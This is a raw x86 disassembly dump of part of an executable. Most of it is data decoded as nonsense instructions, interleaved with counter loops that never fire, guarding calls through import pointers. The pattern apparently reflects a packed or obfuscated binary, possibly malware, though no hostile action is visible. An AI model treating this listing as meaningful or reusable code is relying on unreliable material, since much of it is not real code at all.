  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	push   cs
  408cb7:	les    esi,FWORD PTR [ecx]
  408cb9:	mov    bl,0x14
  408cbb:	fdivr  QWORD PTR [esi+0x7e]
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	push   eax
  408cc3:	leave  
  408cc4:	les    eax,FWORD PTR [esi-0x23]
  408cc7:	push   0x18c7f34e
  408ccc:	and    eax,DWORD PTR [edx+0x11a5ab9c]
  408cd2:	aam    0xe
  408cd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cd5:	ret    0xfd92
  408cd8:	test   DWORD PTR [ebx+0x3df577d5],ebp
  408cde:	push   ebp
  408cdf:	sbb    DWORD PTR [edx+ebx*2-0x39],esi
  408ce3:	cmc    
  408ce4:	cmp    dl,0x6a
  408ce7:	outs   dx,DWORD PTR ds:[esi]
  408ce8:	xchg   DWORD PTR [ecx-0x2b34a49b],ebx
  408cee:	out    0xa1,eax
  408cf0:	ja     0x408c74
  408cf2:	popa   
  408cf3:	cld    
  408cf4:	mov    ecx,0xdd08e8c2
  408cf9:	or     BYTE PTR [esi-0x3983b717],bh
  408cff:	loop   0x408ca8
  408d01:	aaa    
  408d02:	jle    0x408c97
  408d04:	lds    ecx,FWORD PTR [ecx+0x46b127fb]
  408d0a:	or     bl,bl
  408d0c:	jecxz  0x408ca8
  408d0e:	fcomi  st,st(4)
  408d10:	inc    eax
  408d11:	mov    cl,0xcf
  408d13:	ret    
  408d14:	sti    
  408d15:	lds    esi,FWORD PTR [ebx]
  408d17:	jmp    0x408cc1
  408d19:	add    al,0x54
  408d1b:	mov    WORD PTR [esi-0x1bd2b39],?
  408d21:	cmp    esp,eax
  408d23:	cmc    
  408d24:	xchg   edx,eax
  408d25:	add    al,0x55
  408d27:	xor    eax,0x1a323e3b
  408d2c:	mov    ah,0x4e
  408d2e:	jo     0x408cd9
  408d30:	mov    edi,0x8edbdbea
  408d35:	test   BYTE PTR [ebx],ch
  408d37:	imul   ecx,DWORD PTR [esi],0x5acba542
  408d3d:	sbb    ah,cl
  408d3f:	mov    ah,0x3
  408d41:	nop
  408d42:	cmp    al,0xee
  408d44:	test   al,0x3
  408d46:	dec    esp
  408d47:	iret   
  408d48:	lahf   
  408d49:	add    BYTE PTR [edi-0x7],0x8c
  408d4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d4e:	pop    ds
  408d4f:	mov    ebx,0x3cd4022
  408d54:	adc    BYTE PTR [eax],bl
  408d56:	loopne 0x408d36
  408d58:	sub    DWORD PTR [ebx-0x2cf4ea5d],edi
  408d5e:	sub    al,0x86
  408d60:	push   edx
  408d61:	pusha  
  408d62:	fs xor eax,0x16989140
  408d68:	inc    edx
  408d69:	(bad)  [ebp-0x14957af3]
  408d6f:	mov    dl,0xbb
  408d71:	and    ecx,DWORD PTR [edx+0x4963493e]
  408d77:	mov    ds,edx
  408d79:	xchg   esi,eax
  408d7a:	imul   ebx,DWORD PTR [edx+0x64babb78],0xffffffaa
  408d81:	(bad)  
  408d82:	xor    al,0x17
  408d84:	sub    ecx,0xde8ed4a5
  408d8a:	cli    
  408d8b:	and    edx,DWORD PTR [ecx]
  408d8d:	in     eax,0x56
  408d8f:	imul   edi,edi,0xbcabf90a
  408d95:	jp     0x408e05
  408d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d99:	nop
  408d9a:	or     ebp,ebp
  408d9c:	push   ss
  408d9d:	test   eax,0x6b9c3b91
  408da2:	imul   esi,eax,0xfffffffe
  408da5:	addr16 mov eax,ds:0xc49c
  408da9:	mov    edi,0x956d7a46
  408dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408daf:	jb     0x408dff
  408db1:	mov    ds:0x288f03cc,al
  408db6:	hlt    
  408db7:	sahf   
  408db8:	add    BYTE PTR [edx],al
  408dba:	inc    esp
  408dbb:	push   eax
  408dbc:	idiv   BYTE PTR [ebp+0x589c7632]
  408dc2:	mov    bh,ch
  408dc4:	cmp    edx,DWORD PTR [ebp-0x70]
  408dc7:	gs add eax,0x9d921b38
  408dcd:	ret    
  408dce:	cdq    
  408dcf:	outs   dx,BYTE PTR ds:[esi]
  408dd0:	leave  
  408dd1:	jmp    0x3351f110
  408dd6:	(bad)  
  408dd7:	sub    DWORD PTR [ebx],edi
  408dd9:	enter  0x6939,0x1b
  408ddd:	mov    ebx,0xaa28d0ce
  408de2:	call   0x2c83223e
  408de7:	jecxz  0x408db6
  408de9:	lahf   
  408dea:	mov    edi,0x3464afce
  408def:	push   ebx
  408df0:	adc    eax,0x31cd82e9
  408df5:	jnp    0x408ddc
  408df7:	jmp    0x408e55
  408df9:	sbb    ch,BYTE PTR [esi]
  408dfb:	xor    BYTE PTR [eax-0xbd842c4],0xfa
  408e02:	mov    esp,0x9f5fb625
  408e07:	inc    ebp
  408e08:	mov    bh,0xbf
  408e0a:	scas   eax,DWORD PTR es:[edi]
  408e0b:	mov    edi,0x5860e27d
  408e10:	daa    
  408e11:	aad    0x3e
  408e13:	fisttp WORD PTR [eax-0x6e95b7dc]
  408e19:	adc    eax,0x352cd8f3
  408e1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e1f:	lock out dx,al
  408e21:	rol    DWORD PTR [eax+0x4858ba66],0xe5
  408e28:	sub    eax,0x33ddb6be
  408e2d:	ret    0x5b3d
  408e30:	or     al,0xa8
  408e32:	jp     0x408e43
  408e34:	test   BYTE PTR [ecx-0x9],dl
  408e37:	(bad)  
  408e38:	dec    DWORD PTR [ebx+0x81f045]
  408e3e:	add    DWORD PTR ds:0x43e90740,esi
  408e44:	idiv   edi
  408e46:	dec    DWORD PTR [ebx-0x7d161bbb]
  408e4c:	add    DWORD PTR [eax],eax
  408e4e:	add    BYTE PTR ds:0xa417048d,dh
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xcc8030ba
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	mov    eax,ds:0xdd8df6b6
  408e6c:	pop    es
  408e6d:	pop    ecx
  408e6e:	mov    edx,0xdd82d9b1
  408e73:	pushf  
  408e74:	jbe    0x408e55
  408e76:	pop    ecx
  408e77:	ret    0x3eae
  408e7a:	jmp    0x408e34
  408e7c:	mov    BYTE PTR [eax+0x28fe60a1],bh
  408e82:	jbe    0x408e4b
  408e84:	mov    cl,0xc6
  408e86:	addr16 in eax,0x7f
  408e89:	in     al,dx
  408e8a:	xor    cl,dl
  408e8c:	push   eax
  408e8d:	fs ret 0xf73d
  408e91:	cmp    BYTE PTR [eax-0x487556c2],al
  408e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e98:	ret    0xf7c6
  408e9b:	jle    0x408ec9
  408e9d:	stc    
  408e9e:	push   es
  408e9f:	adc    DWORD PTR [esi],edx
  408ea1:	sti    
  408ea2:	cmp    dh,ah
  408ea4:	cld    
  408ea5:	pop    eax
  408ea6:	arpl   WORD PTR [ecx+0x47e4bb46],si
  408eac:	mov    ah,0x52
  408eae:	pop    ebx
  408eaf:	cs in  eax,0x66
  408eb2:	outs   dx,DWORD PTR ds:[esi]
  408eb3:	popa   
  408eb4:	out    0x9c,eax
  408eb6:	fwait
  408eb7:	pop    ds
  408eb8:	fmul   DWORD PTR [ecx-0x7311ae92]
  408ebe:	leave  
  408ebf:	lea    ebx,[edx]
  408ec1:	mov    ds:0x1ff8ba7d,al
  408ec6:	push   edi
  408ec7:	mov    esi,0x93a8763e
  408ecc:	sbb    dl,BYTE PTR [esi+esi*2+0xb3645a9]
  408ed3:	or     BYTE PTR [ecx-0x75],bl
  408ed6:	jle    0x408ee9
  408ed8:	fcomp  QWORD PTR [ebx-0x67de6c0e]
  408ede:	call   0xb4ae:0xc65a3b9d
  408ee5:	ret    0xa16c
  408ee8:	fdivr  DWORD PTR [edx]
  408eea:	cli    
  408eeb:	cmp    esp,DWORD PTR [edi-0x25]
  408eee:	inc    esp
  408eef:	sbb    BYTE PTR [esi-0x6e],0x2f
  408ef3:	gs add al,0x5e
  408ef6:	and    BYTE PTR [esi],ah
  408ef8:	(bad)  
  408ef9:	fsubr  st,st(2)
  408efb:	xor    eax,0x49fedcb4
  408f00:	mov    al,BYTE PTR [ebp+0x337e6d0b]
  408f06:	retf   
  408f07:	shl    DWORD PTR [edx],0xe
  408f0a:	xor    BYTE PTR [edi-0xf5014eb],ah
  408f10:	adc    ch,BYTE PTR [edi+0x68]
  408f13:	call   0x2386a7ea
  408f18:	adc    bh,BYTE PTR [esi-0x34]
  408f1b:	pop    ebp
  408f1c:	fsubr  DWORD PTR [eax+0x280df07b]
  408f22:	mov    WORD PTR [eax],gs
  408f24:	sub    BYTE PTR ds:0x981c686f,bh
  408f2a:	xchg   esi,eax
  408f2b:	fild   DWORD PTR [edi+esi*1]
  408f2e:	rcr    DWORD PTR [esi-0x2bba75da],0xbb
  408f35:	pop    edi
  408f36:	dec    esp
  408f37:	cmp    eax,0x87751f39
  408f3c:	pushf  
  408f3d:	scas   al,BYTE PTR es:[edi]
  408f3e:	push   ss
  408f3f:	(bad)  
  408f40:	test   DWORD PTR [ecx+ebx*2-0xf6f008],esi
  408f47:	enter  0xb749,0x5d
  408f4b:	cmp    DWORD PTR [eax],eax
  408f4d:	stos   BYTE PTR es:[edi],al
  408f4e:	adc    eax,0x1f370dde
  408f53:	shr    ch,1
  408f55:	xor    DWORD PTR [ebx-0x6135effa],edx
  408f5b:	ficomp WORD PTR [ecx+0x17]
  408f5e:	pop    esp
  408f5f:	add    al,0x11
  408f61:	pop    esp
  408f62:	jecxz  0x408f52
  408f64:	lahf   
  408f65:	jp     0x408ef0
  408f67:	fnstenv [eax]
  408f69:	jo     0x408f9d
  408f6b:	and    esp,0xb566c634
  408f71:	or     BYTE PTR [edx+0x35e0afa5],ah
  408f77:	xor    bl,cl
  408f79:	sbb    al,0x67
  408f7b:	loopne 0x408f8f
  408f7d:	jp     0x408ff6
  408f7f:	pop    edi
  408f80:	jg     0x408fea
  408f82:	int3   
  408f83:	mov    ch,0x22
  408f85:	fs cdq 
  408f87:	jl     0x408f92
  408f89:	xor    BYTE PTR [eax],cl
  408f8b:	call   0x406c33ea
  408f90:	mov    dl,0xa1
  408f92:	sub    BYTE PTR ds:0xe6bcc733,0xf9
  408f99:	sub    BYTE PTR [ecx+0x5a],dl
  408f9c:	mov    dl,0x34
  408f9e:	hlt    
  408f9f:	lock aad 0x41
  408fa2:	mov    edi,0xc5bd561b
  408fa7:	repnz call 0xdc25:0xef7333bc
  408faf:	ret    0xad5a
  408fb2:	cwde   
  408fb3:	sti    
  408fb4:	fldcw  WORD PTR [ecx+0x2e9a79fb]
  408fba:	push   ss
  408fbb:	test   al,0x8e
  408fbd:	loope  0x408fd3
  408fbf:	fsubr  st,st(3)
  408fc1:	dec    edi
  408fc2:	push   cs
  408fc3:	(bad)  
  408fc4:	dec    esi
  408fc5:	ds popa 
  408fc7:	call   0x82fb:0x47fc9342
  408fce:	sub    al,0xe1
  408fd0:	mov    dh,0x39
  408fd2:	cmp    BYTE PTR [edi],cl
  408fd4:	test   BYTE PTR [ecx-0x4700000b],dh
  408fda:	call   0xf8fe:0xe9800f1c
  408fe1:	(bad)  
  408fe2:	call   DWORD PTR [ebp-0x75]
  408fe5:	in     al,dx
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4336af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4336af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4336af,ecx
  40900c:	cmp    DWORD PTR ds:0x4336af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4336af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4336eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4336eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4336eb,ecx
  409060:	cmp    DWORD PTR ds:0x4336eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43372f
  409072:	push   0x494f
  409077:	push   0x43379a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4336eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4336f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433703,0x43373b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433677,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4336c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4336db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4336a7,0x43362f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433627
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43373b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433613,0x17
  40910c:	cmp    DWORD PTR ds:0x433613,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433613,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433613
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433613,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4336a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	sub    DWORD PTR [ecx-0x259fc20e],ecx
  40916a:	jle    0x4091ea
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	jb     0x40913d
  409172:	xchg   esi,eax
  409173:	pushf  
  409174:	or     edi,DWORD PTR [edx]
  409176:	(bad)
  40917a:	push   ebp
  40917b:	test   BYTE PTR [edx],bl
  40917d:	pop    es
  40917e:	jmp    0x4091e5
  409180:	adc    ch,BYTE PTR [ebp-0x2aa6df]
  409186:	jge    0x4091da
  409188:	push   esp
  409189:	rcr    dl,0xa9
  40918c:	mov    al,0x24
  40918e:	ss adc eax,0x5237e454
  409194:	sub    eax,0x9937142b
  409199:	fsub   DWORD PTR [ecx]
  40919b:	or     DWORD PTR [ecx],ebx
  40919d:	aaa    
  40919e:	imul   ebx,DWORD PTR [esi+0x2a],0x18
  4091a2:	add    dh,BYTE PTR [edi-0x48]
  4091a5:	cwde   
  4091a6:	dec    ebp
  4091a7:	ret    0x1ea5
  4091aa:	dec    eax
  4091ab:	(bad)  
  4091ac:	mov    al,ds:0x98e84926
  4091b1:	xchg   esp,esi
  4091b3:	enter  0xa4c7,0xb2
  4091b7:	sbb    al,al
  4091b9:	and    ah,BYTE PTR [edx-0x6c]
  4091bc:	retf   0xb0a2
  4091bf:	jmp    0x1f06:0xeba74962
  4091c6:	pop    ebp
  4091c7:	fld    QWORD PTR [ebx+0x20fedc5f]
  4091cd:	pushf  
  4091ce:	jae    0x409225
  4091d0:	adc    BYTE PTR [ebx-0x326a403e],al
  4091d6:	sbb    al,0x47
  4091d8:	lods   al,BYTE PTR ds:[esi]
  4091d9:	sbb    al,0x9d
  4091db:	xchg   ebx,eax
  4091dc:	icebp  
  4091dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091de:	mov    al,ds:0xb038bfb8
  4091e3:	xor    eax,0x9a823d67
  4091e8:	xchg   esp,eax
  4091e9:	not    DWORD PTR [eax]
  4091eb:	and    eax,0x69ef141d
  4091f0:	aad    0xb0
  4091f2:	add    al,0xb9
  4091f4:	sbb    al,0xf2
  4091f6:	xchg   edi,eax
  4091f7:	dec    edx
  4091f8:	ret    0xe9c4
  4091fb:	xchg   BYTE PTR [ecx],cl
  4091fd:	inc    edx
  4091fe:	stos   BYTE PTR es:[edi],al
  4091ff:	(bad)  
  409200:	mov    esp,0x9398ebc7
  409205:	rol    DWORD PTR [eax],cl
  409207:	jp     0x409255
  409209:	pop    ebx
  40920a:	xchg   edx,eax
  40920b:	in     al,0x9f
  40920d:	xchg   edx,eax
  40920e:	imul   ebx,DWORD PTR [eax+0xccd3cd],0xd9b25b6
  409218:	add    DWORD PTR [edi+esi*2+0x58],ebx
  40921c:	fwait
  40921d:	push   0x46
  40921f:	sub    eax,0xa433adf7
  409224:	fimul  WORD PTR [edi]
  409226:	leave  
  409227:	mov    al,ds:0xeb5cd029
  40922c:	scas   al,BYTE PTR es:[edi]
  40922d:	jle    0x4091fd
  40922f:	test   DWORD PTR [eax-0x16],esp
  409232:	jg     0x40928b
  409234:	mov    ds:0x3eb4e56e,al
  409239:	outs   dx,DWORD PTR ds:[esi]
  40923a:	arpl   WORD PTR [esi],dx
  40923c:	dec    ecx
  40923d:	xchg   edi,eax
  40923e:	inc    ebp
  40923f:	sub    bh,0x8a
  409242:	mov    edx,0xbf30592e
  409247:	push   ebx
  409248:	dec    edi
  409249:	in     eax,0x31
  40924b:	pop    edx
  40924c:	adc    BYTE PTR [edi-0x5c],0x11
  409250:	rcl    DWORD PTR ss:[eax-0x6b],1
  409254:	and    edi,ecx
  409256:	adc    dl,BYTE PTR [edx-0x28cd7aa2]
  40925c:	add    DWORD PTR [ebp+0x66],esi
  40925f:	gs jae 0x4091e5
  409262:	add    DWORD PTR [edi],0xbe4b1bda
  409268:	int3   
  409269:	push   ecx
  40926a:	loop   0x4091f8
  40926c:	or     al,0xf6
  40926e:	sahf   
  40926f:	sub    eax,0x20e82d66
  409274:	cwde   
  409275:	aad    0x8
  409277:	mov    ds:0xc7acc9d4,al
  40927c:	lock out dx,eax
  40927e:	inc    ebx
  40927f:	and    ch,BYTE PTR ds:0xcb6ab8f9
  409285:	repz fimul DWORD PTR [esi-0x59]
  409289:	bound  edi,QWORD PTR [esi+0x5a]
  40928c:	xlat   BYTE PTR ds:[ebx]
  40928d:	sub    esp,0x61
  409290:	sub    DWORD PTR [eax+ecx*8],esi
  409293:	sbb    DWORD PTR [ecx+0x6c9db5be],ecx
  409299:	into   
  40929a:	mov    dh,0xff
  40929c:	dec    DWORD PTR [ebx+ebx*8+0xe07653e]
  4092a3:	xchg   esi,eax
  4092a4:	xlat   BYTE PTR ds:[ebx]
  4092a5:	dec    BYTE PTR [eax-0x1f]
  4092a8:	sti    
  4092a9:	es repz cmc 
  4092ac:	repnz into 
  4092ae:	pop    esp
  4092af:	xor    BYTE PTR [eax+0x69475a72],ah
  4092b5:	cmp    al,0x4a
  4092b7:	or     BYTE PTR [ebp-0x98abb32],dl
  4092bd:	adc    ch,BYTE PTR [ecx+0x5c5646c0]
  4092c3:	mov    es,ecx
  4092c5:	and    eax,0xe8f4f43
  4092ca:	ss xchg ebx,eax
  4092cc:	in     eax,dx
  4092cd:	mov    edx,0x4d5536ab
  4092d2:	int    0xeb
  4092d4:	add    ch,BYTE PTR gs:[edx+0x3d457bf9]
  4092db:	js     0x40929a
  4092dd:	jmp    0xe5ff:0xf46b075c
  4092e4:	xor    ebp,DWORD PTR [ecx+esi*1+0xa8c05e9]
  4092eb:	cmp    ebp,DWORD PTR [ebp+0x45]
  4092ee:	cmc    
  4092ef:	jns    0x40934c
  4092f1:	loopne 0x409316
  4092f3:	cwde   
  4092f4:	in     al,0x9f
  4092f6:	mov    esp,0x152f40d5
  4092fb:	(bad)
  4092fe:	mov    dl,0x92
  409300:	mov    ds:0xdb8131ea,al
  409305:	jno    0x409366
  409307:	push   ebx
  409308:	popf   
  409309:	sub    BYTE PTR [edi+0x36c09ac],dh
  40930f:	sbb    edi,DWORD PTR [eax]
  409311:	(bad)  
  409312:	jmp    0x40929a
  409314:	lods   eax,DWORD PTR ds:[esi]
  409315:	mov    WORD PTR [eax+0x13],gs
  409318:	xchg   edi,eax
  409319:	push   0x40
  40931b:	jge    0x40933d
  40931d:	jb     0x409302
  40931f:	pop    ebx
  409320:	add    DWORD PTR [ebp-0x79102bd1],esp
  409326:	cld    
  409327:	xchg   ebp,esp
  409329:	outs   dx,BYTE PTR ds:[esi]
  40932a:	enter  0xa20e,0x9f
  40932e:	mov    ds:0x56b47eb9,al
  409333:	scas   al,BYTE PTR es:[edi]
  409334:	sbb    eax,0xf892c00b
  409339:	rcl    DWORD PTR [esi],0x31
  40933c:	and    dl,dh
  40933e:	lds    ebp,FWORD PTR [ebx-0x11caa59f]
  409344:	adc    DWORD PTR [eax+0xb],ebx
  409347:	dec    edx
  409348:	xchg   esp,eax
  409349:	sub    BYTE PTR [edx-0x38],bl
  40934c:	dec    edx
  40934d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40934e:	loope  0x409349
  409350:	inc    ebx
  409351:	gs mov bl,0x3b
  409354:	stos   DWORD PTR es:[edi],eax
  409355:	mov    esp,0xa99de8f6
  40935a:	test   eax,0xc722d0f9
  40935f:	dec    esi
  409360:	mov    ch,0x6b
  409362:	outs   dx,BYTE PTR ds:[esi]
  409363:	inc    esp
  409364:	dec    eax
  409365:	add    esi,DWORD PTR [edx-0x2a908101]
  40936b:	sti    
  40936c:	inc    esi
  40936d:	xchg   edx,eax
  40936e:	iret   
  40936f:	xchg   esi,eax
  409370:	mov    ds:0x91d5da98,eax
  409375:	stc    
  409376:	fnsave [edx+0x4ea473e2]
  40937c:	xchg   edx,eax
  40937d:	dec    esp
  40937e:	sti    
  40937f:	call   0xaf4f:0xe411b3e4
  409386:	sub    esp,eax
  409388:	iret   
  409389:	stc    
  40938a:	gs pop ss
  40938c:	cwde   
  40938d:	ficom  WORD PTR [edi-0x26]
  409390:	sbb    esi,0x96ff493d
  409396:	mov    ebp,0x5f458116
  40939b:	inc    ebx
  40939c:	ins    BYTE PTR es:[edi],dx
  40939d:	mov    bh,0x21
  40939f:	out    0x97,eax
  4093a1:	je     0x4093df
  4093a3:	xchg   esp,eax
  4093a4:	pop    eax
  4093a5:	or     DWORD PTR [ecx+ebp*2+0x1035a881],esi
  4093ac:	jb     0x40934f
  4093ae:	shl    BYTE PTR [edx],1
  4093b0:	xchg   ebx,eax
  4093b1:	inc    ebx
  4093b2:	pop    ecx
  4093b3:	hlt    
  4093b4:	(bad)  
  4093b5:	jnp    0x40937f
  4093b7:	inc    ebx
  4093b8:	in     eax,0x13
  4093ba:	jns    0x4093f4
  4093bc:	test   DWORD PTR [esi],ebx
  4093be:	xlat   BYTE PTR ds:[ebx]
  4093bf:	xchg   ebx,eax
  4093c0:	pop    edx
  4093c1:	and    al,0x9c
  4093c3:	call   0x160a:0x5c67f5b4
  4093ca:	mov    ah,0xec
  4093cc:	fcomp  QWORD PTR [ebp+0x6b107256]
  4093d2:	fild   DWORD PTR [edx]
  4093d4:	cmp    DWORD PTR [edi-0x41],ebx
  4093d7:	sub    ah,BYTE PTR [edx-0x74d42d7f]
  4093dd:	sbb    BYTE PTR [ecx-0x6fce99a7],bh
  4093e3:	mov    cl,0x15
  4093e5:	push   0xffffffd5
  4093e7:	mov    ecx,esi
  4093e9:	jmp    0x40943f
  4093eb:	pop    ss
  4093ec:	add    al,0x17
  4093ee:	adc    DWORD PTR [ebx+0x2e6e6202],esi
  4093f4:	mov    cl,0x8f
  4093f6:	out    dx,eax
  4093f7:	into   
  4093f8:	cmp    DWORD PTR [ecx],0xcb3a249a
  4093fe:	inc    esi
  4093ff:	pusha  
  409400:	cwde   
  409401:	adc    eax,eax
  409403:	and    DWORD PTR [edx-0x3a],ebp
  409406:	pop    ecx
  409407:	or     al,0xf8
  409409:	mov    ds:0x27f49916,eax
  40940e:	aaa    
  40940f:	adc    DWORD PTR [edi],ecx
  409411:	ret    
  409412:	ja     0x4093cc
  409414:	(bad)  
  409415:	out    0xa7,eax
  409417:	ins    DWORD PTR es:[edi],dx
  409418:	shr    DWORD PTR [edi],cl
  40941a:	push   ss
  40941b:	xchg   esi,eax
  40941c:	cmp    BYTE PTR [eax-0x12],ah
  40941f:	and    ch,ah
  409421:	pop    eax
  409422:	pop    ds
  409423:	enter  0x30c2,0xb8
  409427:	test   eax,0xf40bb6e3
  40942c:	sbb    DWORD PTR [edi],eax
  40942e:	and    al,0x38
  409430:	loope  0x409440
  409432:	and    DWORD PTR [ebp-0x623c97ec],0x3d
  409439:	or     BYTE PTR [eax-0x4e78bd43],0x26
  409440:	pushw  cs
  409442:	xchg   DWORD PTR [ecx-0x6],edi
  409445:	repnz cld 
  409447:	mov    ch,0x58
  409449:	call   0x1cf1:0x931b5e55
  409450:	sbb    eax,0x23bf398
  409456:	mov    BYTE PTR [ebp+0x1304ed11],al
  40945c:	mov    eax,0xf53116f2
  409461:	cmp    eax,0xaf165b20
  409466:	jno    0x409467
  409468:	fld    QWORD PTR [ebx]
  40946a:	(bad)  [edx-0x76b6dff2]
  409470:	repz or eax,0x45c71300
  409476:	in     al,dx
  409477:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40947d:	sub    esi,DWORD PTR [edi]
  40947f:	inc    ebx
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	add    BYTE PTR [ebx],dh
  409486:	leave  
  409487:	add    ecx,DWORD PTR ds:0x43372b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43372b,ecx
  409494:	cmp    DWORD PTR ds:0x43372b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43372b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433613,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433677,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433677
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433677,ebx
  4094f1:	cmp    DWORD PTR ds:0x433677,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433677,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43367b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43367b
  409532:	inc    eax
  409533:	mov    ds:0x43367b,eax
  409538:	cmp    DWORD PTR ds:0x43367b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43367b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43367b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43367b
  40956d:	inc    eax
  40956e:	mov    ds:0x43367b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4336b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433623,0x433613
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433633,0x43372f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0xe3ffa70b
  4095d3:	test   BYTE PTR [ecx+ebx*8+0x7e],ch
  4095d7:	jle    0x409653
  4095d9:	jge    0x409659
  4095db:	jle    0x409565
  4095dd:	rcr    BYTE PTR [esi-0x811b0fb],0xd8
  4095e4:	pusha  
  4095e5:	rol    BYTE PTR [eax],0x55
